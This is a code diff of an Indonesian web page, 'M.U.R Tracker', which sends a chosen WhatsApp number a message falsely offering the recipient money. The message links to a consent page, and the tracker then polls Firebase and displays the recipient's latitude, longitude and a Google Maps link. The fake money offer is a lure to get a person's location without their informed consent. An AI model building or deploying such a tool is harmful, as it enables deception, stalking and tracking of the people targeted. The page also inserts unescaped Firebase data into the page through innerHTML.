@@ -2,147 +2,116 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>M.U.R Tracker</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>M.U.R - Pelacakan</title>
 
 <style>
-*{box-sizing:border-box}
+*{
+  box-sizing:border-box;
+}
 
 body{
-    margin:0;
-    min-height:100vh;
-    background:#1f2933;
-    color:#fff;
-    font-family:Arial,sans-serif;
-    padding:20px;
+  margin:0;
+  font-family:Arial,sans-serif;
+  background:darkgray;
+  color:white;
+  min-height:100vh;
 }
 
-.dashboard{
-    max-width:600px;
-    margin:0 auto;
-    background:#050505;
-    border-radius:25px;
-    padding:25px;
-    border:1px solid #008080;
+.container{
+  width:90%;
+  max-width:500px;
+  margin:40px auto;
 }
 
-.header{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    border-bottom:2px solid #008080;
-    padding-bottom:15px;
-    margin-bottom:20px;
+h1{
+  text-align:left;
+  margin-bottom:10px;
+  color:maroon;
 }
 
-.header h2{
-    margin:0;
-    color:#00a6a6;
+.user{
+  text-align:center;
+  color: red;
+  margin-bottom:30px;
 }
 
-.logout{
-    background:#8b0000;
-    color:white;
-    border:0;
-    padding:8px 15px;
-    border-radius:15px;
+.card{
+  background:maroon;
+  padding:20px;
+  border-radius:15px;
 }
 
-.search{
-    display:flex;
-    gap:10px;
-    margin-bottom:25px;
+input{
+  width:100%;
+  padding:14px;
+  margin:10px 0;
+  border:none;
+  border-radius:8px;
+  font-size:16px;
+  background: black;
+  color: teal;
 }
 
-.search input{
-    flex:1;
-    min-width:0;
-    padding:14px 18px;
-    border:1px solid #777;
-    border-radius:25px;
-    background:#111;
-    color:#fff;
-    outline:none;
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:8px;
+  background: teal;
+  color:white;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
 }
 
-.search button{
-    background:#00a6a6;
-    color:#000;
-    border:0;
-    padding:0 22px;
-    border-radius:25px;
-    font-weight:bold;
+button:active{
+  transform:scale(.98);
 }
 
-.result{
-    background:#111;
-    border:1px dashed #008080;
-    border-radius:15px;
-    padding:20px;
-}
-
-.result h3{
-    margin-top:0;
-    color:#00a6a6;
-}
-
-#status{
-    word-break:break-word;
-}
-
-#location{
-    line-height:1.7;
-    word-break:break-word;
+.status{
+  margin-top:20px;
+  padding:15px;
+  background:#222;
+  border-radius:10px;
+  line-height:1.6;
+  word-break:break-word;
+  color:darkgray;
 }
 
 a{
-    color:#00d0d0;
+  color:#4da6ff;
 }
 </style>
 </head>
 
 <body>
 
-<div class="dashboard">
+<div class="container">
 
-    <div class="header">
-        <div>
-            <h2>★ M.U.R TRACK ★</h2>
-            <small id="user">Memuat...</small>
-        </div>
+<h1>M.U.R</br>TRACKING</h1>
 
-        <button class="logout" onclick="logout()">Keluar</button>
-    </div>
+<div class="user" id="userInfo">
+Memuat akun...
+</div>
 
-    <div class="search">
-        <input
-            id="targetNumber"
-            type="tel"
-            placeholder="Nomor WhatsApp tujuan"
-        >
+<div class="card">
 
-        <button onclick="kirimPermintaan()">
-            Lacak
-        </button>
-    </div>
+<input
+  type="tel"
+  id="targetNumber"
+  placeholder="Nomor WhatsApp penerima"
+>
 
-    <div class="result">
+<button onclick="kirimPermintaan()">
+Minta Lokasi
+</button>
 
-        <h3>Status Permintaan</h3>
+<div class="status" id="status">
+Belum ada permintaan.
+</div>
 
-        <p>
-            <b>Nomor:</b>
-            <span id="nomorHasil">-</span>
-        </p>
-
-        <p>
-            <b>Status:</b>
-            <span id="status">-</span>
-        </p>
-
-        <div id="location"></div>
-
-    </div>
+</div>
 
 </div>
 
@@ -154,108 +123,84 @@ const FIREBASE_URL =
 const HOSTING_URL =
 "https://oralive04-del.github.io/Mur-apk-new/minta_izin.html";
 
-let sesi = null;
-let akun = null;
-let pemantauan = null;
+let timerPemantauan = null;
 
 
 /* =========================
-   SAAT HALAMAN DIBUKA
+   CEK LOGIN
 ========================= */
 
 window.onload = function(){
 
+  const sesi = localStorage.getItem("sesiMUR");
+
+  if(!sesi){
+    window.location.href = "index.html";
+    return;
+  }
+
+  try{
+
+    const dataSesi = JSON.parse(sesi);
+
+    document.getElementById("userInfo").textContent =
+      "Login sebagai: " + (dataSesi.username || "Pengguna");
+
+  }catch(e){
+
+    document.getElementById("userInfo").textContent =
+      "Pengguna M.U.R";
+
+  }
+
+
+  // Pulihkan permintaan sebelumnya
+  const tersimpan = localStorage.getItem("permintaanMUR");
+
+  if(tersimpan){
+
     try{
 
-        sesi = JSON.parse(
-            localStorage.getItem("sesiMUR") || "null"
-        );
+      const data = JSON.parse(tersimpan);
 
-        akun = JSON.parse(
-            localStorage.getItem("akunMUR") || "null"
-        );
+      if(data.target && data.requestId){
+
+        document.getElementById("status").innerHTML =
+          "⏳ Menunggu persetujuan dari penerima...<br><br>" +
+          "Nomor: " + data.target;
+
+        mulaiPemantauan(data.target,data.requestId);
+
+      }
 
     }catch(e){
 
-        sesi = null;
-        akun = null;
+      localStorage.removeItem("permintaanMUR");
 
     }
 
-    if(!sesi || !akun){
-
-        location.href = "index.html";
-        return;
-
-    }
-
-    document.getElementById("user").textContent =
-        "Login: " + (sesi.username || akun.username);
-
-
-    /*
-     * Cek apakah ada permintaan yang sebelumnya
-     * sudah dibuat.
-     */
-
-    const tersimpan =
-        localStorage.getItem("permintaanMUR");
-
-    if(tersimpan){
-
-        try{
-
-            const data = JSON.parse(tersimpan);
-
-            if(data.target && data.requestId){
-
-                document.getElementById("nomorHasil").textContent =
-                    data.target;
-
-                document.getElementById("status").textContent =
-                    "Memeriksa hasil persetujuan...";
-
-                cekPermintaan(
-                    data.target,
-                    data.requestId
-                );
-
-            }
-
-        }catch(e){
-
-            console.log(e);
-
-        }
-
-    }
+  }
 
 };
 
 
 /* =========================
-   NORMALISASI NOMOR
+   FORMAT NOMOR
 ========================= */
 
-function normalisasiNomor(input){
+function normalisasiNomor(nomor){
 
-    let nomor =
-        String(input).replace(/\D/g,"");
+  nomor = nomor.replace(/\D/g,"");
 
-    if(nomor.startsWith("0")){
+  if(nomor.startsWith("0")){
+    nomor = "62" + nomor.substring(1);
+  }
 
-        nomor =
-            "62" + nomor.substring(1);
+  if(nomor.startsWith("8")){
+    nomor = "62" + nomor;
+  }
 
-    }else if(nomor.startsWith("8")){
-
-        nomor =
-            "62" + nomor;
-
-    }
-
-    return nomor;
-
+  return nomor;
 }
 
 
@@ -265,349 +210,285 @@ function normalisasiNomor(input){
 
 async function kirimPermintaan(){
 
-    const input =
-        document.getElementById("targetNumber");
+  let nomor = document.getElementById("targetNumber").value.trim();
 
-    const target =
-        normalisasiNomor(input.value);
+  nomor = normalisasiNomor(nomor);
 
-    if(target.length < 10){
+  if(!nomor){
 
-        document.getElementById("status").textContent =
-            "Nomor WhatsApp tidak valid.";
+    document.getElementById("status").innerHTML =
+      "❌ Masukkan nomor WhatsApp terlebih dahulu.";
 
-        return;
-
-    }
+    return;
+  }
 
 
-    const requestId =
-        "MUR_" +
-        Date.now() +
-        "_" +
-        Math.random()
-        .toString(36)
-        .substring(2,8);
+  const requestId =
+    "MUR_" +
+    Date.now() +
+    "_" +
+    Math.random().toString(36).substring(2,8);
 
 
-    document.getElementById("nomorHasil").textContent =
-        target;
-
-    document.getElementById("status").textContent =
-        "Membuat permintaan...";
-
-    document.getElementById("location").innerHTML = "";
-
-
-    const data = {
-
-        fromUser:
-            sesi.username || akun.username,
-
-        targetPhone:
-            target,
-
-        status:
-            "menunggu",
-
-        createdAt:
-            Date.now()
-
-    };
+  const path =
+    "permintaan/" +
+    encodeURIComponent(nomor) +
+    "/" +
+    encodeURIComponent(requestId) +
+    ".json";
 
 
-    try{
+  const requestData = {
 
-        const response = await fetch(
+    status:"menunggu",
 
-            FIREBASE_URL +
-            "permintaan/" +
-            encodeURIComponent(target) +
-            "/" +
-            encodeURIComponent(requestId) +
-            ".json",
+    nomor:nomor,
 
-            {
-                method:"PUT",
+    requestId:requestId,
 
-                headers:{
-                    "Content-Type":"application/json"
-                },
+    createdAt:Date.now()
 
-                body:JSON.stringify(data)
-            }
-
-        );
+  };
 
 
-        if(!response.ok){
-
-            throw new Error(
-                "Firebase HTTP " +
-                response.status
-            );
-
-        }
+  document.getElementById("status").innerHTML =
+    "⏳ Mengirim permintaan...";
 
 
-        /*
-         * SIMPAN REQUEST
-         * supaya tidak hilang ketika WhatsApp dibuka.
-         */
+  try{
 
-        localStorage.setItem(
-            "permintaanMUR",
-            JSON.stringify({
-                target:target,
-                requestId:requestId
-            })
-        );
+    const response = await fetch(
+      FIREBASE_URL + path,
+      {
+        method:"PUT",
 
+        headers:{
+          "Content-Type":"application/json"
+        },
 
-        const izinURL =
-            HOSTING_URL +
-            "?request=" +
-            encodeURIComponent(requestId) +
-            "&nomor=" +
-            encodeURIComponent(target);
-
-
-        const pesan =
-            "Permintaan M.U.R\n\n" +
-            "Seseorang menawarkan dana untuk Anda melalui M.U.R.\n\n" +
-            "Buka link berikut untuk melihat permintaan dan pilih SETUJUI jika Anda bersedia:\n\n" +
-            izinURL;
-
-
-        const whatsappURL =
-            "https://wa.me/" +
-            target +
-            "?text=" +
-            encodeURIComponent(pesan);
-
-
-        document.getElementById("status").textContent =
-            "Membuka WhatsApp...";
-
-
-        /*
-         * Mulai pemantauan sebelum pindah.
-         */
-
-        mulaiPemantauan(
-            target,
-            requestId
-        );
-
-
-        /*
-         * Buka WhatsApp.
-         */
-
-        window.location.href =
-            whatsappURL;
-
-
-    }catch(error){
-
-        console.error(error);
-
-        document.getElementById("status").textContent =
-            "Gagal membuat permintaan: " +
-            error.message;
-
-    }
-
-}
-
-
-/* =========================
-   MULAI PEMANTAUAN
-========================= */
-
-function mulaiPemantauan(
-    target,
-    requestId
-){
-
-    if(pemantauan){
-
-        clearInterval(pemantauan);
-
-    }
-
-
-    cekPermintaan(
-        target,
-        requestId
+        body:JSON.stringify(requestData)
+      }
     );
 
 
-    pemantauan =
-        setInterval(function(){
+    if(!response.ok){
 
-            cekPermintaan(
-                target,
-                requestId
-            );
+      const errorText = await response.text();
 
-        },3000);
+      throw new Error(
+        "Firebase " +
+        response.status +
+        ": " +
+        errorText
+      );
+
+    }
+
+
+    // Simpan agar bisa dipantau walaupun halaman dibuka ulang
+    localStorage.setItem(
+      "permintaanMUR",
+      JSON.stringify({
+        target:nomor,
+        requestId:requestId
+      })
+    );
+
+
+    const izinURL =
+      HOSTING_URL +
+      "?request=" +
+      encodeURIComponent(requestId) +
+      "&nomor=" +
+      encodeURIComponent(nomor);
+
+
+    const pesan =
+      "seseorang menawarkan Dana untuk anda dari APLIKASI M.U.R.\n\n" +
+      "Silakan buka link berikut dan pilih SETUJUI jika Anda bersedia:\n\n" +
+      izinURL;
+
+
+    const whatsappURL =
+      "https://wa.me/" +
+      nomor +
+      "?text=" +
+      encodeURIComponent(pesan);
+
+
+    document.getElementById("status").innerHTML =
+      "✅ Permintaan berhasil dibuat.<br><br>" +
+      "📱 Membuka WhatsApp...<br>" +
+      "⏳ Menunggu persetujuan penerima...";
+
+
+    // Mulai memantau sebelum WhatsApp dibuka
+    mulaiPemantauan(nomor,requestId);
+
+
+    setTimeout(function(){
+
+      window.location.href = whatsappURL;
+
+    },700);
+
+
+  }catch(error){
+
+    console.error(error);
+
+    document.getElementById("status").innerHTML =
+      "❌ Gagal mengirim permintaan.<br><br>" +
+      error.message;
+
+  }
 
 }
 
 
 /* =========================
-   CEK FIREBASE
+   PEMANTAUAN FIREBASE
 ========================= */
 
-async function cekPermintaan(
-    target,
-    requestId
-){
+function mulaiPemantauan(nomor,requestId){
 
-    try{
-
-        const response = await fetch(
-
-            FIREBASE_URL +
-            "permintaan/" +
-            encodeURIComponent(target) +
-            "/" +
-            encodeURIComponent(requestId) +
-            ".json"
-
-        );
+  if(timerPemantauan){
+    clearInterval(timerPemantauan);
+  }
 
 
-        if(!response.ok){
-
-            throw new Error(
-                "Firebase HTTP " +
-                response.status
-            );
-
-        }
+  // Cek langsung
+  cekPermintaan(nomor,requestId);
 
 
-        const data =
-            await response.json();
+  // Cek setiap 3 detik
+  timerPemantauan = setInterval(function(){
 
+    cekPermintaan(nomor,requestId);
 
-        if(!data){
-
-            document.getElementById("status").textContent =
-                "Permintaan tidak ditemukan.";
-
-            return;
-
-        }
-
-
-        if(data.status === "menunggu"){
-
-            document.getElementById("status").textContent =
-                "Menunggu persetujuan dari penerima...";
-
-        }
-
-
-        else if(data.status === "ditolak"){
-
-            if(pemantauan){
-
-                clearInterval(pemantauan);
-
-            }
-
-            document.getElementById("status").textContent =
-                "Permintaan ditolak.";
-
-            document.getElementById("location").innerHTML =
-                "";
-
-        }
-
-
-        else if(data.status === "disetujui"){
-
-            if(pemantauan){
-
-                clearInterval(pemantauan);
-
-            }
-
-            document.getElementById("status").textContent =
-                "Lokasi disetujui.";
-
-            
-            if(
-                data.lat !== undefined &&
-                data.lng !== undefined
-            ){
-
-                document.getElementById("location").innerHTML =
-
-                    "<b>Latitude:</b> " +
-                    data.lat +
-
-                    "<br><b>Longitude:</b> " +
-                    data.lng +
-
-                    "<br><br>" +
-
-                    "<a target='_blank' href='https://www.google.com/maps?q=" +
-                    encodeURIComponent(
-                        data.lat + "," + data.lng
-                    ) +
-                    "'>" +
-
-                    "📍 Buka di Google Maps" +
-
-                    "</a>";
-
-            }else{
-
-                document.getElementById("location").textContent =
-                    "Persetujuan diterima, tetapi koordinat belum tersedia.";
-
-            }
-
-        }
-
-
-    }catch(error){
-
-        console.error(error);
-
-        document.getElementById("status").textContent =
-            "Gagal membaca status: " +
-            error.message;
-
-    }
+  },3000);
 
 }
 
 
 /* =========================
-   LOGOUT
+   CEK STATUS
 ========================= */
 
-function logout(){
+async function cekPermintaan(nomor,requestId){
 
-    localStorage.removeItem("sesiMUR");
+  try{
 
-    if(pemantauan){
+    const path =
+      "permintaan/" +
+      encodeURIComponent(nomor) +
+      "/" +
+      encodeURIComponent(requestId) +
+      ".json";
 
-        clearInterval(pemantauan);
 
+    const response = await fetch(
+      FIREBASE_URL + path,
+      {
+        method:"GET",
+        cache:"no-store"
+      }
+    );
+
+
+    if(!response.ok){
+
+      console.log(
+        "Firebase GET:",
+        response.status
+      );
+
+      return;
     }
 
-    location.href =
-        "index.html";
+
+    const data = await response.json();
+
+
+    if(!data){
+
+      return;
+    }
+
+
+    console.log("Status permintaan:",data);
+
+
+    /* =========================
+       DITOLAK
+    ========================= */
+
+    if(data.status === "ditolak"){
+
+      clearInterval(timerPemantauan);
+
+      localStorage.removeItem("permintaanMUR");
+
+      document.getElementById("status").innerHTML =
+        "❌ Permintaan ditolak oleh penerima.";
+
+      return;
+    }
+
+
+    /* =========================
+       DISETUJUI
+    ========================= */
+
+    if(data.status === "disetujui"){
+
+      clearInterval(timerPemantauan);
+
+      document.getElementById("status").innerHTML =
+        "✅ dana berhasil diterima!<br><br>" +
+
+        "📍 Latitude: " +
+        data.lat +
+
+        "<br>📍 Longitude: " +
+        data.lng +
+
+        "<br><br>" +
+
+        "<a target='_blank' href='https://www.google.com/maps?q=" +
+        encodeURIComponent(data.lat + "," + data.lng) +
+        "'>" +
+
+        "🗺️ Buka lokasi di Google Maps" +
+
+        "</a>";
+
+
+      return;
+    }
+
+
+    /* =========================
+       MASIH MENUNGGU
+    ========================= */
+
+    document.getElementById("status").innerHTML =
+      "⏳ Menunggu persetujuan dari penerima...<br><br>" +
+
+      "Nomor: " + nomor;
+
+  }catch(error){
+
+    console.error(
+      "Gagal membaca Firebase:",
+      error
+    );
+
+  }
 
 }
 
 </script>
 
 </body>
-    </html>
+</html>
